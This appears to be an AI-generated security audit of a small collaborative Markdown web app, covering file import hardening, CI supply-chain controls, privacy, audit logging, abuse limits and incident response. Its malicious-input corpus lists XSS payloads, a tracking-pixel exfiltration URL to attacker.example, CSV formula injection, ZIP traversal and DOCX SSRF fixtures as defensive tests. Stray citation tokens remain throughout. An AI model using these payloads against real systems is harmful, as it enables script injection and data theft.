**Library comparison**

| Library | Security/operational fit | Verdict |
|---|---|---|
| `zip.js` | Browser-oriented streaming, Workers, large-file support; you still enforce all policy yourself | **Best fit for hostile ZIP input** |
| `fflate` | Very small and fast, streaming APIs; more of the policy/wiring falls on you; recent streaming fixes make version pinning important | Good alternative |
| JSZip | Easy API and modern versions sanitize `..` components; less attractive for hostile large archives because common usage buffers whole entries/archive | Easiest, not safest default |

zip.js’s official repository documents streaming and Worker-oriented operation. citeturn8search8 fflate supports streaming and Worker use, but its own release history includes recent stream-related fixes, so pin and regression-test the exact version. citeturn8search10turn8search16 JSZip added path sanitization against `..` components in its 3.8-era loader, but your application should reject hostile names rather than silently normalizing two attacker-controlled paths into one logical filename. citeturn8search1

**`.docx`**

The master plan’s generic `mammoth → sanitize → turndown` sequence is **not sufficient without a version floor and sandboxing**. fileciteturn0file1

A Mammoth directory-traversal/file-disclosure advisory says the issue was patched in version `1.11.0`. citeturn22view16 A later advisory covers Mammoth **before `1.12.2`** and includes prototype-pollution/file-disclosure risk. citeturn22view17 A subsequent 2026 ReDoS advisory affects versions before `1.12.3`. citeturn8search9

Therefore, on this audit date the minimum acceptable family is **Mammoth ≥ 1.12.3**, subject to rechecking the advisory database immediately before installation.

When implemented:

```text
input-size cap
→ dedicated Worker
→ Mammoth with external file access disabled
→ ignore external relationships
→ ignore embedded OLE objects
→ reject macro-enabled formats
→ HTML syntax tree
→ sanitize
→ Turndown / controlled Markdown conversion
→ sanitize/render tests again
```

Never let the converter fetch `file://`, HTTP(S), loopback or metadata-service URLs.

**Notion/Obsidian**

Treat their archives as generic hostile ZIP + text. Do not execute Notion HTML. Do not load external images. Rewrite links only after every archive path has been normalized and entered into a collision-free import map. Ignore `.obsidian/` plugins, CSS snippets and plugin data. Specific 2026 Notion-export filename/link conventions in the previous PDFs were not re-confirmed from a primary source and remain **UNVERIFIED**.

**Malicious-input corpus**

| ID | Input | Expected safe outcome |
|---|---|---|
| M01 | `<script>alert(1)</script>` | Removed/treated as text; no execution |
| M02 | `<img src=x onerror=alert(1)>` | Removed |
| M03 | `<svg onload=alert(1)>` | Removed |
| M04 | `<iframe srcdoc="<script>alert(1)</script>">` | Removed |
| M05 | `[x](javascript:alert(1))` | `href` removed |
| M06 | `[x](JaVaScRiPt:alert(1))` | `href` removed |
| M07 | `[x](data:text/html,<script>alert(1)</script>)` | Removed |
| M08 | `[x](//attacker.example/x)` | Rejected |
| M09 | `![pixel](https://attacker.example/pixel?x=secret)` | No request; image absent |
| M10 | `<style>body{background:url(https://attacker)}</style>` | Removed |
| M11 | `<object data="https://attacker"></object>` | Removed |
| M12 | `<form id=x name=location>` | Removed; no DOM clobber |
| M13 | heading crafted as `# location` | Generated ID prefixed or absent |
| M14 | YAML key `__proto__:` | Rejected/ignored; prototype unchanged |
| M15 | YAML key `constructor: { prototype: ... }` | Rejected |
| M16 | YAML custom tag such as `!!js/function` | Rejected |
| M17 | YAML alias-expansion bomb | Parser aborts on configured limits |
| M18 | CSV `=HYPERLINK("https://evil","x")` | Export neutralized |
| M19 | CSV `+cmd|' /C calc'!A0` | Export neutralized |
| M20 | ZIP entry `../../outside.md` | Whole import or entry rejected |
| M21 | ZIP entry `/etc/passwd` | Rejected |
| M22 | ZIP entry `C:\Users\x\evil.md` | Rejected |
| M23 | ZIP symlink `docs/x -> ../../x` | Rejected |
| M24 | Tiny compressed entry expanding beyond 100 MiB | Worker aborts |
| M25 | Archive with more than 1,000 entries | Abort |
| M26 | ZIP containing nested ZIP bomb | Nested archive remains inert/rejected |
| M27 | `A.md` and `a.md` collision | Import stops for explicit resolution |
| M28 | `CON.md`, `NUL.md`, `LPT1.md` | Rejected for portable export |
| M29 | Overlong 300+ character filename | Rejected |
| M30 | `.docx` relationship to `file:///etc/passwd` | No local-file read |
| M31 | `.docx` relationship to `http://127.0.0.1/` | No network request |
| M32 | Crafted Mammoth style-map ReDoS case | Worker timeout/abort |
| M33 | Prototype-pollution Mammoth regression fixture | `Object.prototype` unchanged |
| M34 | Notion Markdown containing raw `<video autoplay>` | HTML inert/removed |
| M35 | Obsidian `![[../../secret]]` | Cannot escape import namespace |
| M36 | Uploaded SVG containing `<script>` | Upload rejected |
| M37 | JPEG carrying EXIF GPS metadata | Re-encoded output lacks GPS metadata |

**Attacks and proof tests:** M01/M05 prove XSS scheme handling, M09 proves passive exfiltration is blocked, M24 proves decompression limits, and M30/M31 prove document conversion cannot become local-file/SSRF access.

**Counter-argument tested:** JSZip or Mammoth can make import features dramatically faster to ship. The 2025–2026 advisory record shows why “library handles the format” is not a security boundary. Markdown ZIP already satisfies most of the product value with less attack surface.

**Cost check:** all proposed libraries/controls can be OSS/$0. The catch is maintenance: file parsers are security-sensitive dependencies and must be monitored continuously.

**C5 — Repository, CI and supply-chain security**

**Single recommendation:** create a **secret-free, least-privilege build pipeline** first; add native GitHub security while the repo is public plus gitleaks/OSV/npm checks that continue to work if it becomes private.

GitHub says secret scanning is available for public repositories on GitHub.com; private/internal coverage depends on account/product eligibility. citeturn22view7 CodeQL/code scanning similarly has broad free public-repository availability, while private coverage is a paid-plan/code-security distinction. citeturn10search12 Dependabot’s dependency graph, alerts and security updates are more broadly available to public and private repositories. citeturn11search0turn11search2turn22view8

**Public vs private on GitHub Free**

| Control | Public repo | Private personal Free repo |
|---|---|---|
| Dependabot dependency graph/alerts | Yes | Yes |
| Dependabot security updates | Yes | Yes |
| Native secret scanning | Yes | Generally not the same free coverage |
| Push protection for secrets | Available for public use | Paid/private eligibility differs |
| CodeQL default scanning | Free public coverage | Paid private coverage normally required |
| Private vulnerability reporting | Public-repository feature | Not applicable in the same way |
| Rulesets/protected branches | Free public-repo coverage | Private repository availability depends on paid GitHub tier |
| Actions | Public standard runners broadly free | Free account has a monthly private-actions allowance |

GitHub’s ruleset and protected-branch documentation distinguishes public GitHub Free use from broader private-repository support on paid accounts. citeturn9search0turn9search9 Private vulnerability reporting is specifically designed for public repositories. citeturn9search13turn9search15

**Do this regardless of visibility**

```yaml
# .github/workflows/ci.yml
name: CI

on:
  push:
    branches: [main]
  pull_request:

permissions:
  contents: read

jobs:
  test:
    runs-on: ubuntu-latest
    timeout-minutes: 30

    steps:
      # Pin every third-party action to a full commit SHA in the real file.
      - uses: actions/checkout@<FULL_40_CHAR_COMMIT_SHA>

      - uses: actions/setup-node@<FULL_40_CHAR_COMMIT_SHA>
        with:
          node-version-file: ".nvmrc"
          cache: npm

      - run: npm ci

      - run: npm audit --omit=dev --audit-level=high

      - run: npm run typecheck
      - run: npm run build
      - run: npm run test
```

Do not paste tags such as `@v4` into the final hardened workflow. GitHub’s own Actions security guidance recommends immutable/full-SHA references or dependency lockfiles where supported. citeturn20view13

Never use `pull_request_target` to check out and execute untrusted pull-request code with repository secrets. GitHub has repeatedly documented the “pwn request” class resulting from that combination. citeturn9search21

**Gitleaks starter rules**

```toml
# .gitleaks.toml
[extend]
useDefault = true

[[rules]]
id = "supabase-secret-key"
description = "Supabase sb_secret key"
regex = '''sb_secret_[A-Za-z0-9_-]{20,}'''
keywords = ["sb_secret_"]

[[rules]]
id = "sensitive-env-assignment"
description = "Sensitive deployment credential assignment"
regex = '''(?i)(SUPABASE_SERVICE_ROLE_KEY|SUPABASE_SECRET_KEY|GMAIL_APP_PASSWORD|SMTP_PASS)\s*[:=]\s*["']?[^"'\s]{8,}'''
```

Do not create a blanket allowlist for legacy Supabase JWT-looking keys: legacy `anon` and `service_role` credentials can look structurally similar. Your new `sb_publishable_...` value is intentionally public; the `sb_secret_...` value is not.

Supabase’s current API-key documentation explicitly distinguishes publishable keys, which are intended for public components such as browser applications, from secret keys, which provide elevated server-side access and bypass normal RLS protections. citeturn22view6 Therefore:

- committing the **publishable** key is not a secret leak;
- committing an `sb_secret_` key is an incident;
- create separate server secret keys for logically distinct backend jobs where practical, so one can be revoked independently.

The PDF correctly says the application has already moved to the newer publishable/secret key family, with one legacy fallback still present in the MCP component. fileciteturn0file0 Remove the legacy fallback once everything is verified.

**Supply-chain response to 2025–2026**

The 2025 Shai-Hulud campaign used malicious package-install behavior and stolen credentials to spread through npm packages; GitHub/npm reported removing hundreds of affected packages and announced stronger npm security controls. citeturn22view9 GitHub’s 2026 Dependabot work also references the September 2025 `chalk`/`debug` compromise and introduced a default dependency-update cooldown intended to reduce exposure to brand-new malicious releases. citeturn12search1

Controls that survive those attacks:

```text
commit package-lock.json
use npm ci in CI/deployments
do not auto-merge dependency updates
let dependency updates age before adoption
review unexpected lifecycle scripts
pin GitHub Actions to full SHA
run dependency/security checks with no production secrets
keep Vercel preview/build secrets to the minimum
use overrides to pin away from a known-bad transitive release
```

npm now has newer controls around lifecycle scripts and release age, but the exact October-2026 syntax/semantics of `allow-scripts` and `min-release-age` were not fully confirmed from the primary documentation opened in this audit. Treat the exact `.npmrc` form as **UNVERIFIED** until checked against your pinned npm version. citeturn12search17

A useful experiment is:

```bash
npm ci --ignore-scripts
npm run build
npm test
```

If the application works, make `--ignore-scripts` your deployment install. If it fails, identify exactly which packages need lifecycle scripts instead of dropping the protection without analysis.

**Vercel build-secret warning:** `VITE_*` values are deliberately compiled into browser output. Never use that prefix for secrets. Also assume a malicious package install/build process can inspect build-time environment variables; therefore the best supply-chain protection is to avoid making Gmail/Supabase server secrets available during dependency installation/build when the platform configuration permits separation.

Vercel’s 2026 deployment-protection change means preview protection no longer needs a Pro purchase. citeturn22view5 Use it for preview URLs.

**Owner root accounts**

For GitHub, Vercel, Supabase and Google:

```text
unique password
strongest phishing-resistant MFA offered by that service
offline recovery material
no shared recovery mailbox where avoidable
review active sessions/devices
minimize PAT/API token count
remove obsolete OAuth applications
```

The exact October-2026 passkey/recovery-code capabilities of all four control planes were not each independently primary-verified in this run; the recommendation remains sound, while provider-specific availability is **UNVERIFIED**.

**Attacks and proof tests**

| Attack | Example | Control | Test |
|---|---|---|---|
| Secret accidentally committed | Add fake `sb_secret_TEST...` | gitleaks + native scanning | CI must fail |
| PR steals secrets | Fork modifies postinstall/test | no PR secrets, read-only token, no unsafe `pull_request_target` | Fork CI sees no production secret |
| Malicious brand-new package | Dependency release compromised hours after publish | cooldown + manual review | Dependabot PR does not auto-merge |
| Action tag retargeted | `uses: vendor/action@v1` moved | full SHA | CI lint rejects non-SHA external action |
| Compromised build dep reads Vercel env | malicious postinstall | install-scripts policy + minimum build secrets | canary secret absent during test install |

**Counter-argument tested:** a private repository hides implementation details from opportunistic attackers. True. Security should not rely on hiding code, but privacy can justify it—especially if real documents, email addresses or snapshots have ever entered repository history. Therefore repository visibility is not a dogmatic security choice: first ensure equivalent gitleaks/OSV/npm controls work privately, then choose privacy based on data content.

**Cost check:** $0. The catch is that several GitHub-native security features are materially better on a public repo than a private Free repo. OSS CI checks close much, not all, of that gap.

**C6 — Invitee and user privacy**

**Single recommendation:** store the minimum identity data needed for authentication/authorization, delete duplicate invitation data promptly, keep security telemetry pseudonymous/aggregated, and support a manual export/delete workflow.

**Data inventory**

| Location | Personal data likely present | Keep? |
|---|---|---|
| `auth.users` | email, provider identity, account timestamps/auth metadata | Yes while account exists |
| invitations | invited email, inviter, project/org, timestamps, token digest | Until resolved + short cleanup period |
| memberships | Auth UUID, project/org, role | While membership exists |
| document revisions | actor UUID, edit timestamps | Keep for document integrity, pseudonymize on account deletion |
| security log | actor UUID, event, result | Limited retention |
| share stats | link ID and aggregate counts | Yes; no raw IP |
| Gmail Sent | invite recipient/address/content | Delete on short operational schedule |
| Vercel/Supabase operational logs | request metadata | Provider-controlled retention |
| GitHub Actions artifacts | potentially traces/screenshots | Ensure no production PII; short retention |

The previous plan says “purge or hash invitee email after accept/expiry.” fileciteturn0file1 **MODIFY:** deletion is preferable when the duplicate address is no longer needed. A deterministic email hash remains linkable personal data and provides little value once a membership references the Auth user.

Do not remove the email from `auth.users` while email/password is the authentication identifier.

Member-facing UIs should show display name and role. Email should be visible only where someone genuinely needs it for membership/invitation administration.

Invitation previews should not reveal “this email already has an account” or another person’s address to unauthenticated visitors. Return the same page shape until an authenticated user accepts.

**Suggested retention policy**

These are app-design choices rather than legal defaults:

```text
expired/unused invite record:
  erase email/token digest shortly after operational reconciliation

accepted invite:
  erase duplicate invite email after acceptance/reconciliation

failed anonymous-share rate buckets:
  keep only through abuse-investigation window, then delete

security events:
  retain a bounded operational period, e.g. months rather than forever

Gmail invite messages:
  use a dedicated mailbox/label and periodically purge sent invitation mail

document revision authorship after user deletion:
  pseudonymize as "Deleted user" rather than deleting history
```

**Deletion workflow**

```text
1. prevent deletion if user is the last organization owner;
2. transfer or explicitly remove ownership;
3. revoke memberships and invitations;
4. revoke/expire sessions through the current Supabase admin mechanism;
5. delete favourites/notifications/private profile data;
6. pseudonymize historical author IDs where integrity requires records;
7. purge duplicate email fields and user-specific audit metadata after retention;
8. delete the Supabase Auth user;
9. produce a deletion summary.
```

Do not cascade-delete shared document history merely because one author deletes an account.

**Legal scope**

This is not legal advice.

The UK ICO explains that the UK GDPR has an exemption for genuinely **personal or household activity**. citeturn21view4turn21view5 A hosted collaboration used only personally may fall near that boundary, but inviting unrelated collaborators, broad public sharing, or later commercial use can change the analysis. Whether GeminiForge actually falls inside an EU/UK household exemption is therefore **UNVERIFIED and fact-dependent**.

GDPR Article 17 contains the right-to-erasure framework when specified grounds apply. citeturn14search12 Exact EU/UK/US legal obligations cannot be responsibly determined from the technical facts alone; US state laws differ and were not exhaustively jurisdiction-mapped in this run.

The practical controls above remain sensible even if a particular privacy statute does not apply.

**Attacks/tests**

| Attack | Defence | Test |
|---|---|---|
| Probe invite token to learn invited email | unauthenticated page never renders address | compare responses |
| Low-role user enumerates member emails | member projection omits email | role matrix |
| Logs accidentally contain `token=`/email | structured log allowlist | search CI/runtime test logs |
| Delete user leaves membership orphan | explicit cleanup transaction/reconciliation | fixture delete test |

**Counter-argument tested:** retaining invitation details forever improves troubleshooting. For a handful of users, the troubleshooting value is tiny; the privacy cost accumulates indefinitely. Event outcome and project/invite IDs are enough.

**Cost check:** $0.

**C7 — Append-only audit logging**

**Single recommendation:** use a small application-specific security event table, immutable to normal app roles, instead of enabling verbose database-wide audit collection.

Supabase makes the PostgreSQL `pgaudit` extension available for database audit logging. citeturn21view0 It is valuable for investigations but is too noisy as your permanent application audit design, especially under a small Free database and limited log-retention environment.

Vercel’s current Runtime Logs documentation gives Hobby only a short live history; the plan’s “about one hour” claim is consistent with Vercel’s current plan table. citeturn22view10 That reinforces the need to retain *security events you care about* yourself rather than treating infrastructure logs as your audit trail.

```sql
create table private.security_audit_log (
  id bigint generated always as identity primary key,
  occurred_at timestamptz not null default now(),

  actor_user_id uuid,
  actor_kind text not null
    check (actor_kind in ('user', 'anonymous', 'share', 'system')),

  org_id uuid,
  project_id uuid,

  event_type text not null,
  target_type text,
  target_id uuid,

  outcome text not null
    check (outcome in ('success', 'denied', 'failure')),

  metadata jsonb not null default '{}'::jsonb
);

revoke all on private.security_audit_log
  from public, anon, authenticated;

create function private.reject_security_audit_mutation()
returns trigger
language plpgsql
set search_path = ''
as $$
begin
  raise exception 'security audit log is append-only';
end;
$$;

create trigger security_audit_no_mutation
before update or delete on private.security_audit_log
for each row
execute function private.reject_security_audit_mutation();
```

The insertion helper should accept typed values and a small metadata allowlist. Internal application functions call it; browser roles never receive direct table privileges.

Log:

```text
role/membership changes
invite creation/acceptance/revocation
share create/revoke
share redemption success, aggregate denial thresholds
project export
project/account destructive operations
sensitive AAL2 RPC denial
security setting changes
emergency kill-switch actions
```

Do **not** log:

```text
passwords
raw invite/share tokens
Supabase secret keys
document bodies
full request headers
Authorization headers
raw IPs indefinitely
entire user agents
routine document reads
every keystroke/save
```

For log injection, keep structured columns; never construct a CSV/log line with attacker-controlled values. When exporting CSV, apply the spreadsheet neutralization discussed in C4.

The app roles cannot update/delete this log. The database owner still can. Therefore it is **tamper-resistant, not tamper-proof**.

A hash chain in the same database does not materially stop an administrator who can rewrite both rows and chain. The plan’s weekly external head-hash email would improve tamper evidence, but for one owner it adds operational complexity. fileciteturn0file1 **MODIFY:** ship immutable rows first; add external anchoring only if the audit log becomes important enough to justify it.

Your uploaded state reports roughly 15 MB used out of a 500 MB Free database. fileciteturn0file0 Keep audit events security-only and retention-bounded so they never become the dominant dataset.

**Attacks/tests**

| Attack | Defence | Test |
|---|---|---|
| Authenticated user deletes incriminating audit event | no table grant + trigger | SQL under authenticated role fails |
| XSS string poisons exported audit CSV | structured log + CSV neutralization | `=1+1` exported inert |
| Share flood generates millions of rows | aggregate counters/throttle logging | flood test grows bounded rows |
| DB owner rewrites log | Residual risk | document that trigger is not DBA-proof |

**Counter-argument tested:** `pgaudit` gives much broader visibility with almost no schema work. True, but its volume and provider-retention dependency are poor matches for a 500 MB Free personal application. Use it temporarily during targeted investigations rather than as the permanent event ledger.

**Cost check:** $0. Paid log drains/longer hosted retention should not be assumed.

**C8 — Abuse and free-tier exhaustion**

**Single recommendation:** eliminate unauthenticated write surfaces wherever possible; place tiny application-level quotas and emergency switches on the few unavoidable public endpoints.

Vercel’s Bot Protection is now generally available and described by Vercel as available to users at no additional cost. citeturn22view11 Vercel WAF/rate-limit capabilities also exist on Hobby, but plan-specific rule counts and overage behavior mean they should be defense-in-depth rather than the only protection. citeturn5search0turn5search2turn5search3

**Public attack surfaces after this audit**

```text
GET /                   static shell
GET /share              inert share shell
POST share redemption   anonymous but capability-gated
Supabase sign-in        rate-limited by Supabase
/api/join               capability + CAPTCHA
/api/invite             authenticated AAL2 only
/api/csp-report         anonymous, tightly bounded
```

There should be no public signup endpoint and no arbitrary email-sending endpoint.

**Invite mail**

The current plan’s `20/hour` and `60/day` per organization are unnecessarily high for “a few invited people.” fileciteturn0file1 I would reduce local policy to something such as:

```text
3 sends / hour / organization
10 sends / day / organization
3 sends / day / recipient
```

Those are GeminiForge policy choices, not Gmail limits.

The exact 2026 daily sending limit for consumer Gmail when used through an app-password SMTP client was not confirmed from a sufficiently strong primary Google source in this run. The PDF itself had relied on a third-party “about 500/day” claim. **Treat that number as UNVERIFIED and remove it from the plan.**

`/api/invite` must:

```text
require authenticated user
require AAL2
check org owner/admin permission server-side
require an existing unexpired invitation row
derive recipient from that row
derive subject/body from application template
refuse caller-provided SMTP envelope sender/body
enforce database quota
use one generic failure response
never return Gmail/SMTP diagnostic detail to browser
```

That makes it incapable of becoming a generic spam relay even if the frontend is modified.

Supabase Auth has its own platform/IP rate limits; the primary documentation describes default request-rate controls for sign-in/signup classes. citeturn2search19 Public signup being disabled dramatically reduces your exposure.

**Share endpoint**

Before expensive work:

```text
check method
check Origin/CORS for browsers
cap request body
reject token length/alphabet errors
apply rate bucket
check global share_enabled flag
then hash/query capability
```

CORS/Origin is not authentication—non-browser clients can spoof it—but it reduces browser abuse.

Use a pseudonymous short-lived abuse key, not a permanent raw IP log.

A database kill switch:

```sql
create table private.security_settings (
  singleton boolean primary key default true check (singleton),
  public_sharing_enabled boolean not null default true,
  invitation_sending_enabled boolean not null default true,
  updated_at timestamptz not null default now()
);
```

Have the server check it before share or invitation work.

**Supabase `pre_request` per-IP rate limiting:** PostgREST supports pre-request hooks, but the exact reliable client-address header and trust model behind the hosted Supabase proxy were not fully primary-confirmed in this run. **UNVERIFIED; do not make it the first-line design.** The proxy/endpoint already has better contextual information.

**Realtime**

Do not create Realtime subscriptions for anonymous share viewers. The application has only a few signed-in collaborators, so authenticated Realtime use is unlikely to be the first legitimate quota bottleneck; exact current Free Realtime message/connection limits were not re-verified in this security run and are therefore **UNVERIFIED** here.

**Attack scenarios**

| Attack | Steps | Control | Test |
|---|---|---|---|
| SMTP relay | Modify JS to POST arbitrary `to` and body | server ignores caller recipient/body | send attempt reaches only DB invite |
| Signup bot | Call Auth signup directly | public signup disabled | request fails |
| Share quota burn | millions of invalid secrets | early format/rate/kill checks | threshold produces bounded DB/Edge work |
| CSP-report spam | POST huge JSON | content type/body cap/rate | oversized request rejected before DB |
| Realtime exhaustion from share page | connect anonymously | no client configuration/anon channel grants | no WS connection after `/share` load |

**Counter-argument tested:** more rate-limiting infrastructure itself consumes time and creates failure states. Correct. For a solo application, a handful of deterministic counters plus free platform bot protection is preferable to Redis, third-party WAFs or elaborate behavioral scoring.

**Cost check:** $0. The catch is that a sufficiently determined attacker can still consume provider Free quotas before application-level code rejects them. The kill switch is therefore important.

**C9 — Solo-owner incident response**

**Single recommendation:** prepare a one-page runbook and test every destructive/recovery action before public sharing.

**Prepare now**

```text
[ ] offline infrastructure-account recovery material
[ ] current inventory of every production credential and where it is used
[ ] documented Supabase secret-key rotation
[ ] documented Gmail app-password rotation
[ ] documented Vercel environment-variable redeploy
[ ] "disable public sharing" switch
[ ] "revoke every active share link" owner action
[ ] tested app-owner MFA recovery
[ ] clean local clone / reproducible build
[ ] contact list for affected collaborators
```

**Leaked share link**

```text
1. revoke that share_links row;
2. flip global sharing off if scope is uncertain;
3. inspect aggregate use around the suspected exposure;
4. remember the scope is the entire project;
5. issue a new independently labelled link if still needed;
6. notify affected collaborators where disclosure is material;
7. record incident cause and prevention.
```

Revocation stops future fetches; it cannot erase data already copied by a recipient.

**Leaked publishable Supabase key**

Do not treat this alone as credential compromise. Supabase’s current documentation says publishable keys are intended for public components. citeturn22view6

Instead:

```text
verify RLS and GRANTs;
look for abuse;
rotate only if useful operationally.
```

If a publishable key grants sensitive data, the actual incident is an authorization failure.

**Leaked `sb_secret_`**

Supabase documents secret keys as backend credentials with elevated/RLS-bypassing authority. citeturn22view6

```text
1. revoke/delete leaked key immediately;
2. disable sensitive public functionality while investigating;
3. create replacement key;
4. update each backend using that key;
5. redeploy;
6. inspect affected tables/audit events;
7. rotate downstream secrets exposed to that backend if necessary;
8. determine how the secret escaped.
```

Do not waste time rewriting Git history before rotation. Once a secret is public, assume it has been copied.

**Compromised member**

```text
remove/disable membership access
revoke their active sessions using the current Supabase admin mechanism
review role changes and edits since compromise
restore malicious document changes from revisions
revoke public links created during compromise if applicable
reset password/MFA
re-enrol only after identity recovery
```

The exact current Supabase admin API for forcibly revoking all sessions should be verified and exercised in a disposable account; I did not independently confirm that exact 2026 API call in this run.

**Compromised GitHub**

```text
recover GitHub identity
revoke PATs/Actions credentials
stop automated deployments
inspect workflow/repository modifications
rotate any deployment credential accessible to Actions
rebuild from trusted commit
redeploy
```

**Compromised Vercel**

```text
recover Vercel identity
stop deployments / protect production if necessary
rotate Vercel-accessible secrets
inspect project settings, redirects, env vars and recent deploys
redeploy trusted build
```

**Compromised Supabase**

This is the worst infrastructure event because it can expose the database, Auth and server secrets.

```text
recover organization/project control
rotate secret/legacy API credentials
review Auth identities/MFA changes
disable public sharing
review SQL/function/policy/migration changes
export evidence before destructive cleanup
restore trusted schema/data if necessary
```

**Compromised Google/Gmail**

```text
recover Google account
terminate sessions
replace Gmail app password
review forwarding rules/delegates/sent mail
update Vercel secret
assume historical invitation recipient addresses were visible
```

**Malicious AI/imported content accepted**

Because rendering remains sanitized even for accepted canonical Markdown, acceptance should not turn untrusted text into executable HTML. Revert the document revision, identify any external links or exposed data, invalidate dangerous exports if distributed, and add the payload to the permanent rendering corpus.

**Repo secret exposure**

```text
revoke first
rotate second
deploy replacement third
scan logs/use fourth
clean history last
```

**Cost check:** $0. The only catch is owner discipline: recovery procedures that have never been tested are not reliable controls.

## Security test pack and document verdicts

**Security test pack**

These tests should run against a disposable Supabase test project/local database wherever a destructive action is involved.

1. **Anonymous private document read:** `anon` selects a non-public `docs` row → zero rows/permission denial.
2. **Public exception:** `anon` reads only the intentionally public built-in project → succeeds only for that explicit project.
3. **Anonymous revision read:** query `doc_revisions` → denied.
4. **Signed-in non-member:** authenticated user reads another project → zero rows/denied.
5. **Org member without project membership:** private project read → denied.
6. **Project viewer:** read canonical docs → allowed; update/delete → denied.
7. **Project editor:** allowed canonical document edit; membership/role mutation → denied.
8. **Project manager:** expected manager actions succeed; org-owner-only actions fail.
9. **Org admin:** allowed org administration according to existing matrix; cannot bypass explicit super-owner rules.
10. **Share viewer REST isolation:** from share page, direct `GET /rest/v1/docs` with public key → no private content.
11. **Share viewer Realtime isolation:** attempt anonymous/private project subscription → rejected/no data.
12. **Share viewer Storage isolation:** guessed object path → denied.
13. **Valid capability:** project projection contains canonical current documents only.
14. **Projection leakage:** assert JSON contains no keys matching `email`, `user_id`, `revision`, `token`, `audit`, `draft`, `comment`.
15. **Expired share:** valid digest with past expiry → generic denial.
16. **Revoked share:** valid digest with `revoked_at` → generic denial.
17. **Malformed share:** wrong length/alphabet → rejected before DB lookup.
18. **Share scanner GET:** `GET /share#valid` without JS click → no view counter increment.
19. **Explicit redemption:** click Open → exactly one redemption request.
20. **Address-bar cleanup:** after redemption, `page.url()` no longer contains secret.
21. **Referrer:** external navigation from share → receiving server gets no `Referer`.
22. **Third-party network:** share load/redeem produces no requests to Google Fonts, analytics or arbitrary origins.
23. **Share cache:** response has `Cache-Control: no-store`.
24. **Revocation after first view:** redeem → revoke → second fetch fails immediately.
25. **Public signup disabled:** raw Supabase signup attempt fails.
26. **Invitation GET inert:** opening invite link does not consume invitation.
27. **Wrong signed-in email:** invited token bound to another email cannot be accepted.
28. **Existing user path:** account-bound invite requires normal authentication instead of password-reset-style takeover.
29. **New invited user:** valid unused invite + valid password creates exactly one account/membership.
30. **Invite replay:** second acceptance fails idempotently.
31. **AAL1 privileged RPC:** signed-in password-only owner calls share-create/role-change → denied.
32. **AAL2 privileged RPC:** same owner after TOTP verification → succeeds.
33. **Enumeration:** known and unknown email attempts have equivalent response status/message class.
34. **CAPTCHA:** invalid/missing Turnstile token on new-account endpoint → denied.
35. **SMTP arbitrary recipient:** modify `/api/invite` POST body → server still sends only to invitation row recipient.
36. **SMTP arbitrary body:** injected HTML/subject fields from client are ignored/escaped.
37. **Markdown raw script:** M01 → no script DOM and no dialog.
38. **Markdown `javascript:` URL:** M05 → anchor has no executable href.
39. **Remote Markdown image:** M09 → network log contains no attacker-origin request.
40. **DOM clobber:** crafted heading/form names cannot replace `window.location`, `document.forms` application references or app IDs.
41. **Prototype pollution:** M14/M15 → `{}` gains no attacker property.
42. **ZIP traversal:** M20/M21/M22 → rejected.
43. **ZIP symlink:** M23 → rejected.
44. **ZIP bomb:** M24 → Worker aborts before exceeding application emitted-byte cap.
45. **ZIP entry flood:** M25 → abort at configured entry limit.
46. **Case/normalization collision:** M27 → importer asks for resolution/rejects rather than overwriting.
47. **DOCX local-file regression:** M30 → no local-file access.
48. **DOCX loopback/SSRF regression:** M31 → no HTTP request.
49. **DOCX ReDoS:** M32 → Worker terminated at processing budget.
50. **SVG upload:** M36 → server/client refuses the file type.
51. **CSP script:** inject inline `<script>` → browser reports/blocks when CSP enforced.
52. **Frame protection:** external page tries to iframe app → denied.
53. **Header suite:** `/` has CSP, no-referrer, nosniff, permissions policy, HSTS, COOP/CORP.
54. **Share headers:** `/share` additionally returns no-store and noindex.
55. **Static cache:** hashed `/assets/...` uses immutable long caching.
56. **Audit update:** authenticated user attempts `UPDATE private.security_audit_log` → denied.
57. **Audit delete:** same for `DELETE` → denied.
58. **Audit secret hygiene:** create/redeem links then search log table for raw secret → no match.
59. **Gitleaks fixture:** add fake `sb_secret_...` to a test commit → security workflow fails.
60. **Action-policy lint:** workflow referencing `uses: vendor/action@v1` → repository check fails.
61. **Emergency share kill:** set sharing off → every otherwise-valid capability fails.
62. **Emergency re-enable:** sharing on restores only unexpired, unrevoked links.
63. **Deleted-user cleanup:** delete test user → no active membership/invite/private profile remains.
64. **Deleted-user history:** shared revision history remains internally consistent but actor is pseudonymized.
65. **Role downgrade live session:** editor→viewer then old JWT attempts edit → RLS applies current membership and rejects.
66. **Security-definer outsider:** authenticated non-member invokes every public definer RPC → none exposes another project.
67. **Security-definer anon:** enumerate RPCs as `anon` → only deliberately public endpoints execute.
68. **Search isolation:** share viewer cannot search hidden/revision/trash text.
69. **Export isolation:** share viewer cannot invoke full-project backup/export API.
70. **CSP report abuse:** oversized/malformed report → rejected without DB growth.

**AGREE / MODIFY / DISAGREE audit of security-relevant PDF decisions**

The table below treats the updated files as claims, not authority. fileciteturn0file0 fileciteturn0file1 fileciteturn0file2 fileciteturn0file3

| PDF decision/claim | Verdict | Reason |
|---|---|---|
| Private by default | **AGREE** | Correct default for confidential workspace |
| Intentional one public built-in project | **AGREE WITH TEST** | Fine if explicit policies isolate it from every private table |
| Project-wide share semantics | **AGREE** | Simple mental model; make each capability independently revocable |
| `#/s/<secret>` | **MODIFY** | Use `/share#<secret>` for route-specific controls |
| 256-bit random capability | **AGREE** | Vastly more entropy than necessary for brute-force resistance; leakage dominates |
| Store SHA-256 only | **AGREE** | Appropriate for random high-entropy secret |
| Slow password hashing for share secret | **DISAGREE if added** | No benefit proportional to complexity for 256-bit random secret |
| Constant-time SQL comparison required | **MODIFY** | Indexed SHA-256 lookup is sufficient; use timing-safe compare only when actually comparing fixed secret bytes |
| Browser-facing anonymous `SECURITY DEFINER` share RPC | **DISAGREE** | Prefer proxy with no share-browser Data API authority |
| Load page never consumes link | **AGREE** | Essential against scanners |
| Auto-redeem on page load | **DISAGREE** | Require explicit user gesture |
| Expiring/revocable shares | **AGREE** | Core capability hygiene |
| View count + last viewed | **AGREE** | Low-data telemetry is sufficient |
| Store detailed viewer IP history | **DISAGREE** | Unnecessary privacy cost |
| Exclude review/drafts/Trash/members/tokens/audit/comments | **AGREE** | Expand exclusion to revisions, notifications, exports, Storage, Realtime |
| `noindex`/no-referrer “on hash route only” | **DISAGREE technically** | Server cannot distinguish hash route; use global headers or dedicated `/share` path |
| Keep Google Fonts under CSP | **MODIFY** | System/self-hosted fonts remove a needless third party |
| Start CSP Report-Only | **AGREE** | Correct deployment strategy |
| Current inline CSS architecture unchanged under strict CSP | **DISAGREE** | Move CSS to external Vite asset |
